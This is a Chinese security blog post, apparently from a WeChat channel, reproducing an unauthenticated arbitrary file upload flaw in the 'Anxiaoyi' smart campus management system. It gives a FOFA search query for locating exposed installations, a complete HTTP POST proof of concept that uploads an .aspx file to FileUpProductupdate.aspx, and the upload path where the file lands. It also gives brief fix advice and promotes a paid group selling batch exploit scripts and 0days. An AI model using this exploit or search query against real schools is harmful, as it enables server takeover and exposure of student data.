#  『漏洞复现』智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞   
冷漠安全  冷漠安全   2024-05-26 22:31  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qRzaH5GUoT3wjfxgNKKQaVgq5UdQuTjibZ7l0YMRTIbMrfABFictia4ZEXKWAic1RbHRib9CiajtbcKQcw/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
“安校易”是银达云创公司基于多年教育市场信息化建设经验沉淀，经过充分的客户需求调研，并依据国家“十三五”教育信息化建设规范而推出的综合互联网+教育信息化解决方案。“安校易”以物联网技术为基础，以学生在校“学食住行”管理为中心，将消费管理、门禁管理、各类学生出入管理、家校互通、校门口进出身份识别等系统进行集成，有效减少校园管理盲点，提升校园安全防范与管理水平  
。  
  
0x03  
  
**漏洞威胁**  
  
智慧校园(安校易)管理系统 FileUpProductupdate.aspx 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
title="智慧综合管理平台登入"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qc0E3hprcYohw2RP5EMl9ia8zIX1TQtzl7BkUyXOpicIsPvtQCd5wzlt2v6qZPIYPDvHqFGVQa8N6A/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
**漏洞复现**  
  
POC  
```
POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
Connection: close


------21909179191068471382830692394
Content-Disposition: form-data; name="Filedata"; filename="qaz.aspx"
Content-Type: image/jpeg

<%@Page Language="C#"%><%Response.Write("123456");System.IO.File.Delete(Request.PhysicalPath);%>
------21909179191068471382830692394--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qc0E3hprcYohw2RP5EMl9ias0ibD9Mcic54Aslrdm69sk3icghibfM7hW1uGt5Vfia2oAZEr6TALIgGTzg/640?wx_fmt=png&from=appmsg "")  
```
/Upload/Publish/000000/0_0_0_0/update.aspx
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qc0E3hprcYohw2RP5EMl9iah6bFkNyYxxDibdOdIE6gtw3XZtiaQAqiapfhaPfEBqKbJCRWY7WY7MRDg/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qc0E3hprcYohw2RP5EMl9iamJd3QfwibqPmYYwOQ2Qm5SY027DbvVvcaT6DGDI2esSCQIPxUumOI0A/640?wx_fmt=png&from=appmsg "")  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qc0E3hprcYohw2RP5EMl9iaWSeicD261yeR3fSg5ljZSiaNvxMGqeoky83GLVMyOzIEia5OBWkBQKZiaw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qc0E3hprcYohw2RP5EMl9iaicJ5aLmWuhrczsgG6UUIWAKuiaWDcXgtl6VbY1LcenQfqREaOMs31DGw/640?wx_fmt=gif&from=appmsg "")  
  
  
